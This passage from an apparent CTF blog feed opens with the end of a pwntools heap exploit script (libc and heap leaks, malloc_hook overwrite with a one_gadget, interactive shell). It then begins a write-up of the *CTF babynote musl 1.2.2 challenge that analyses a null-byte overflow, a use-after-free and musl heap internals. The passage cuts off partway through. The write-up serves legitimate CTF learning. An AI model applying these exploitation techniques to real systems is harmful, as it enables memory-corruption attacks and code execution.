class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x3f0</span>,<span class=\"string\">b&quot;cccc&quot;</span>)</span><br><span class=\"line\">echo(<span class=\"string\">b&#x27;d&#x27;</span>*<span class=\"number\">8</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">cp(<span class=\"string\">b&#x27;dddd&#x27;</span>,<span class=\"string\">b&#x27;AAAA&#x27;</span>)</span><br><span class=\"line\">cd(<span class=\"string\">b&quot;AAAA&quot;</span>)</span><br><span class=\"line\">cat(<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;d&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">libcbase  = u64(r.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x3ebca0</span> +<span class=\"number\">0x1ff0c0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;libcbase : &quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">malloc_hook = libcbase + <span class=\"number\">0x1ecb70</span>-<span class=\"number\">0x23</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak the chunk addr</span></span><br><span class=\"line\">cd(<span class=\"string\">b&#x27;../&#x27;</span>)</span><br><span class=\"line\">mkdir(<span class=\"string\">b&#x27;ii&#x27;</span>)</span><br><span class=\"line\">cp(<span class=\"string\">b&#x27;dddd&#x27;</span>,<span class=\"string\">b&#x27;ii&#x27;</span>)</span><br><span class=\"line\">rmv(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;ii&#x27;</span>)</span><br><span class=\"line\">cd(<span class=\"string\">b&quot;AAAA&quot;</span>)</span><br><span class=\"line\">rmv(<span class=\"number\">1</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">cd(<span class=\"string\">b&#x27;../&#x27;</span>)</span><br><span class=\"line\">echo(<span class=\"string\">b&#x27;\\x70&#x27;</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">cp(<span class=\"string\">b&#x27;dddd&#x27;</span>,<span class=\"string\">b&#x27;AAAA&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">cd(<span class=\"string\">b&quot;AAAA&quot;</span>)</span><br><span class=\"line\">cat(<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">r.recv()</span><br><span class=\"line\">heap_addr = u64(r.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)) - <span class=\"number\">0x001470</span></span><br><span class=\"line\">fake = heap_addr+<span class=\"number\">0x2800</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;heap_addr : &quot;</span>,<span class=\"built_in\">hex</span>(heap_addr))</span><br><span class=\"line\"><span class=\"comment\">#onegadget = 0xcafebabedeadbeef</span></span><br><span class=\"line\">onegadget = <span class=\"number\">0xe3b31</span>+libcbase</span><br><span class=\"line\">cd(<span class=\"string\">b&#x27;../&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">touch(<span class=\"string\">b&quot;free&quot;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">b&#x27;actim&#x27;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">b&#x27;null&#x27;</span>)</span><br><span class=\"line\">malloc(<span class=\"number\">0x2a0</span>,<span class=\"string\">b&#x27;nop&#x27;</span>)</span><br><span class=\"line\">malloc(<span class=\"number\">0x50</span>,<span class=\"string\">b&#x27;1111&#x27;</span>)</span><br><span class=\"line\">malloc(<span class=\"number\">0x110</span>,<span class=\"string\">b&#x27;2222&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#clean the chunk</span></span><br><span class=\"line\">malloc(<span class=\"number\">0x40</span>,<span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">malloc(<span class=\"number\">0x40</span>,<span class=\"string\">b&#x27;4&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\">malloc(<span class=\"number\">0x68</span>,<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">rmv(<span class=\"number\">1</span>,<span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">malloc(<span class=\"number\">0x130</span>,<span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">malloc(<span class=\"number\">0x120</span>,<span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">malloc(<span class=\"number\">0x130</span>,<span class=\"string\">b&#x27;5&#x27;</span>)</span><br><span class=\"line\">malloc(<span class=\"number\">0x1</span>,<span class=\"string\">b&#x27;6&#x27;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">b&#x27;mmmm&#x27;</span>)</span><br><span class=\"line\">dbg()</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;brva 0x01884&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#change the chunksize wo achieve overlap</span></span><br><span class=\"line\">malloc(<span class=\"number\">0x68</span>,<span class=\"string\">b&#x27;1&#x27;</span>,<span class=\"string\">b&#x27;\\x51\\x04&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">dbg()</span><br><span class=\"line\">mkdir(<span class=\"string\">b&#x27;dir&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">malloc(<span class=\"number\">0x70</span>,<span class=\"string\">b&#x27;dir&#x27;</span>)</span><br><span class=\"line\">mkdir(<span class=\"string\">b&#x27;dir2&#x27;</span>)</span><br><span class=\"line\">mkdir(<span class=\"string\">b&#x27;dir3&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">malloc(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;dir3&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;malloc_hook : &quot;</span>,<span class=\"built_in\">hex</span>(malloc_hook))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(p64(malloc_hook))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pad = p64(malloc_hook)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(pad[<span class=\"number\">0</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(pad[<span class=\"number\">5</span>:<span class=\"number\">7</span>])</span><br><span class=\"line\">malloc(<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;dir2&#x27;</span>,pad[<span class=\"number\">0</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\">dbg()</span><br><span class=\"line\">pad = p64(onegadget)</span><br><span class=\"line\">echo(<span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">0x23</span>)+pad[<span class=\"number\">0</span>:<span class=\"number\">6</span>],<span class=\"string\">b&#x27;5&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">touch(<span class=\"string\">b&#x27;7&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<p>题目文件在链接里</p>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/04/19/starctf-babynote/",
            "url": "http://example.com/2022/04/19/starctf-babynote/",
            "title": "starctf_babynote",
            "date_published": "2022-04-19T11:37:17.000Z",
            "content_html": "<h1 id=\"starctfbabynote-musl122\"><a class=\"markdownIt-Anchor\" href=\"#starctfbabynote-musl122\">#</a> starctf\tbabynote musl1.2.2</h1>\n<h2 id=\"环境以及保护\"><a class=\"markdownIt-Anchor\" href=\"#环境以及保护\">#</a> 环境以及保护</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop<span class=\"comment\">/*ctf/babbynote/attachment$ file babynote </span></span><br><span class=\"line\"><span class=\"comment\">babynote: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, stripped</span></span><br><span class=\"line\"><span class=\"comment\">dreamcat@ubuntu:~/Desktop/*ctf/babbynote/attachment$ checksec --file=babynote</span></span><br><span class=\"line\"><span class=\"comment\">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH\tSymbols\t\tFORTIFY\tFortified\tFortifiable\tFILE</span></span><br><span class=\"line\"><span class=\"comment\">Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols\t  No\t0\t\t2\t\tbabynote</span></span><br><span class=\"line\"><span class=\"comment\">dreamcat@ubuntu:~/Desktop/*ctf/babbynote/attachment$ ./libc.so </span></span><br><span class=\"line\"><span class=\"comment\">musl libc (x86_64)</span></span><br><span class=\"line\"><span class=\"comment\">Version 1.2.2</span></span><br><span class=\"line\"><span class=\"comment\">Dynamic Program Loader</span></span><br><span class=\"line\"><span class=\"comment\">Usage: ./libc.so [options] [--] pathname [args]</span></span><br><span class=\"line\"><span class=\"comment\">dreamcat@ubuntu:~/Desktop/*ctf/babbynote/attachment$ </span></span><br></pre></td></tr></table></figure>\n<p>第一次做 musl 的题目，有点迷茫。一边查资料一边摸着做。比赛的时候没有任何的突破。</p>\n<h2 id=\"探索的过程\"><a class=\"markdownIt-Anchor\" href=\"#探索的过程\">#</a> 探索的过程</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop<span class=\"comment\">/*ctf/babbynote/attachment$ ./libc.so babynote </span></span><br><span class=\"line\"><span class=\"comment\">                                                   </span></span><br><span class=\"line\"><span class=\"comment\">    _/  _/  _/        _/_/_/  _/_/_/_/_/  _/_/_/_/ </span></span><br><span class=\"line\"><span class=\"comment\">     _/_/_/        _/            _/      _/        </span></span><br><span class=\"line\"><span class=\"comment\">  _/_/_/_/_/      _/            _/      _/_/_/     </span></span><br><span class=\"line\"><span class=\"comment\">   _/_/_/        _/            _/      _/          </span></span><br><span class=\"line\"><span class=\"comment\">_/  _/  _/        _/_/_/      _/      _/           </span></span><br><span class=\"line\"><span class=\"comment\">                                                   </span></span><br><span class=\"line\"><span class=\"comment\">                                                   </span></span><br><span class=\"line\"><span class=\"comment\">--------menu-------</span></span><br><span class=\"line\"><span class=\"comment\">1: add a note</span></span><br><span class=\"line\"><span class=\"comment\">2: find a note</span></span><br><span class=\"line\"><span class=\"comment\">3: delete a note</span></span><br><span class=\"line\"><span class=\"comment\">4: forget all notes</span></span><br><span class=\"line\"><span class=\"comment\">5: exit</span></span><br><span class=\"line\"><span class=\"comment\">option:</span></span><br></pre></td></tr></table></figure>\n<p>发现并没有 edit 的功能。</p>\n<p>反汇编以后，对于结构体的认知。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00000000</span> babynote        struc ; (<span class=\"keyword\">sizeof</span>=<span class=\"number\">0x28</span>, mappedto_6)</span><br><span class=\"line\"><span class=\"number\">00000000</span> name            dq ?</span><br><span class=\"line\"><span class=\"number\">00000008</span> note            dq ?</span><br><span class=\"line\"><span class=\"number\">00000010</span> name_size       dq ?</span><br><span class=\"line\"><span class=\"number\">00000018</span> note_size       dq ?</span><br><span class=\"line\"><span class=\"number\">00000020</span> next            dq ?</span><br><span class=\"line\"><span class=\"number\">00000028</span> babynote        ends</span><br></pre></td></tr></table></figure>\n<p>存在一个全局数组，储存了 abbynote 的指针，形成一个单链表。采用头插法进行添加。</p>\n<h3 id=\"add\"><a class=\"markdownIt-Anchor\" href=\"#add\">#</a> add</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">add</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  babynote *ptr; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  ptr = (babynote *)<span class=\"built_in\">calloc</span>(<span class=\"number\">1uLL</span>, <span class=\"number\">0x28</span>uLL);</span><br><span class=\"line\">  ptr-&gt;name_size = addname(&amp;ptr-&gt;name);</span><br><span class=\"line\">  ptr-&gt;note_size = addnote(&amp;ptr-&gt;note);</span><br><span class=\"line\">  ptr-&gt;next = (__int64)<span class=\"built_in\">list</span>;</span><br><span class=\"line\">  <span class=\"built_in\">list</span> = (babynote **)ptr;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;ok&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/*--------------------------------------------------------*/</span></span><br><span class=\"line\">__int64 __fastcall <span class=\"title function_\">addname</span><span class=\"params\">(__int64 *ptr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> size; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;name size: &quot;</span>);</span><br><span class=\"line\">  size = getnum();</span><br><span class=\"line\">  *ptr = (__int64)<span class=\"built_in\">calloc</span>(<span class=\"number\">1uLL</span>, size);           <span class=\"comment\">// calloc清空数据</span></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;name: &quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">int</span>)readnode(*ptr, size);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> __int64 __fastcall <span class=\"title function_\">readnode</span><span class=\"params\">(__int64 a1, <span class=\"type\">unsigned</span> __int64 a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> buf; <span class=\"comment\">// [rsp+13h] [rbp-Dh] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+14h] [rbp-Ch]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; a2 &gt; (<span class=\"type\">int</span>)i; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">1uLL</span>) != <span class=\"number\">1</span> )</span><br><span class=\"line\">      <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">    *(_BYTE *)(a1 + (<span class=\"type\">int</span>)i) = buf;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( buf == <span class=\"string\">&#x27;\\n&#x27;</span> )                          <span class=\"comment\">// 一字节\\x00溢出</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      *(_BYTE *)((<span class=\"type\">int</span>)i + a1) = <span class=\"number\">0</span>;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> a2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/*--------------------------------------------------------*/</span></span><br><span class=\"line\">__int64 __fastcall <span class=\"title function_\">addnote</span><span class=\"params\">(<span class=\"type\">void</span> *a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> size; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;note size: &quot;</span>);</span><br><span class=\"line\">  size = getnum();</span><br><span class=\"line\">  *(_QWORD *)a1 = <span class=\"built_in\">calloc</span>(<span class=\"number\">1uLL</span>, size);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;note content: &quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">int</span>)readnode(*(_QWORD *)a1, size);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>add 添加时，ida 分析的结果并不准确，这里永远存在一字节的空溢出。</p>\n<p>后来根据网上查到的学习资料。由于 musl 的堆管理比较简单，这个空溢出可以用来修改 chunk 的 idx 位，伪造 meta。</p>\n<p>后面再说。</p>\n<h3 id=\"find\"><a class=\"markdownIt-Anchor\" href=\"#find\">#</a> find</h3>\n<p>find 会创建一个 name 的 chunk, 然后根据 size 以及 list 保留的 size,cmp，最后比较字符串。如果相同就返回第一个找到的符合要求的 babynote 指针。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">find</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">void</span> *ptr; <span class=\"comment\">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> size; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\">  babynote *v3; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v4; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  ptr = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  size = addname(&amp;ptr);</span><br><span class=\"line\">  v3 = cmp(ptr, size);                          <span class=\"comment\">// 确认数据</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v3 )</span><br><span class=\"line\">    info(v3-&gt;note, v3-&gt;note_size);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;oops.....&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v4;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//输出babynote的信息</span></span><br><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">info</span><span class=\"params\">(<span class=\"type\">char</span> *a1, <span class=\"type\">unsigned</span> __int64 a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+1Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%#lx:&quot;</span>, a2);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; a2 &gt; i; ++i )</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%02x&quot;</span>, a1[i]);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(&amp;s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出的信息也会收到 size 的限制。当时我有看到一个点，就是 i 是有符号的，而 a2 无符号。但是貌似没有什么价值。最后 free 那个临时创建的 chunk.</p>\n<h3 id=\"delete\"><a class=\"markdownIt-Anchor\" href=\"#delete\">#</a> delete</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">delete</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  babynote *v1; <span class=\"comment\">// [rsp+8h] [rbp-28h] BYREF</span></span><br><span class=\"line\">  babynote **i; <span class=\"comment\">// [rsp+10h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> size; <span class=\"comment\">// [rsp+18h] [rbp-18h]</span></span><br><span class=\"line\">  babynote *ptr; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  v1 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  size = addname(&amp;v1);</span><br><span class=\"line\">  ptr = cmp(v1, size);                          <span class=\"comment\">// /删除某个特定的</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( ptr )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( ptr != <span class=\"built_in\">list</span> || <span class=\"built_in\">list</span>-&gt;next )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( ptr-&gt;next )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> ( i = &amp;<span class=\"built_in\">list</span>; ptr != *i; i = &amp;(*i)-&gt;next )</span><br><span class=\"line\">          ;</span><br><span class=\"line\">        *i = ptr-&gt;next;</span><br><span class=\"line\">      &#125;                                         <span class=\"comment\">// 解链表</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">list</span> = <span class=\"number\">0LL</span>;                               <span class=\"comment\">// 删除头指针，就清空了所有</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr-&gt;name);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr-&gt;note);                            <span class=\"comment\">// 释放note</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;ok&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;oops.....&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(v1);                                     <span class=\"comment\">// 删除临时结构体</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v5;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>删除 note 的时候，会遍历链表，找到对应的指针后，会 set 对应结构的 next 指针。p-&gt;next = p-&gt;next-&gt;next. 但是如果 ptr 是尾指针，就不会进行 set. 存在 UAF</p>\n<h2 id=\"利用\"><a class=\"markdownIt-Anchor\" href=\"#利用\">#</a> 利用</h2>\n<p>delete 最后一个，只会 free 对应的堆块，但是倒数第二个 babynote 的 next 没有 reset, 所以就存在了 uaf. 但是 musl 的堆块释放后并不会进入 bins。只有 meta 的所有 avail_maks 都被释放后才会将 meta 释放，并把 meta 放入双链表，dequeue（所以 meta free 后是）</p>\n<p>程序的了漏洞在于 delete 时存在的 UAF, 如果我们将其释放后，并对其 note 进行 reuse, 而且用作 babbynote, 就会在 slot 上储存 3 个指针，导致 heapaddr 泄露。但是这里需要布置对的结构。</p>\n<p><em><strong><u>musl 的堆比较特殊，meta 页是按照顺序申请的，而且与 group 页隔离。当同一个 size 的 meta 分配满之后，如果继续申请，会使用 avail_meta 保留的一个 meta 地址，当然这了 meta 是全新的。而且，一旦申请后，malloc_context active 数组对应位置就会保留正在分配的 meta. 同时会将这两个 meta 的 prev next 设置，形成双链表。如果其中一个 meta 满无法分配，或者被 free，就会解开连表。full_meta 的 prev 和 next 被清零。</u></strong></em></p>\n<h3 id=\"泄露libc\"><a class=\"markdownIt-Anchor\" href=\"#泄露libc\">#</a> 泄露 libc</h3>\n<p>回到题目，这里我们可以泄露 group 组的地址，slot 地址是在 libc 的基础上得到的，所以泄露出 heap 的用户区地址就可以得到里 libc 地址。</p>\n<p>我们利用堆风水，将链表的最后一个 bebynote 释放，存在 uaf，然后通过构造，拿到他的 note slot 作为一个新的 babynote, 这杨这里就储存了 heapd 的地址，然后泄露。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span 